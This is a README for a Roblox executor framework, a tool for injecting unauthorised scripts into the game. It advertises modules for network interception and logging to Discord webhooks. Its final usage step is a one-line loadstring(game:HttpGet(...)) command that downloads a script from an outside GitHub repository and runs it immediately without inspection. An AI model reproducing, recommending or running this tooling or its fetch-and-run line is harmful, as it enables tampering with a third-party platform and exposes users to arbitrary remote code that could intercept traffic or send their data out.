
A modular Roblox executor framework with webhook integration and network interception capabilities.

## Project Structure

```
delta_executor/
├── delta_executor_final_main.lua - Main entry point
├── delta_executor_ui.lua         - User interface components
├── delta_executor_network.lua    - Network interception
├── delta_executor_webhook.lua    - Discord webhook integration
└── delta_executor_settings.lua   - Configuration management
```

## Features

- **Modular Design**: Each component is separated for easy maintenance
- **Webhook Integration**: Send execution logs to Discord
- **Network Interception**: Monitor and log network traffic
- **Customizable UI**: Theming and layout options

## Installation

1. Place all module files in the same directory
2. Require the main module in your script:
```lua
local Delta = require(path.to.delta_executor_final_main)
Delta.Init()
```

## Usage

```lua
-- Setup webhook
Delta.SetupWebhook("https://discord.com/api/webhooks/...")

-- Start network interception
Delta.StartInterception()
```
## OR 

Execute
```lua
loadstring(game:HttpGet("https://raw.githubusercontent.com/Mrdeep009/NETWORK-INTERSEPTER-ROBLOX/refs/heads/main/client_execute.lua"))()
```

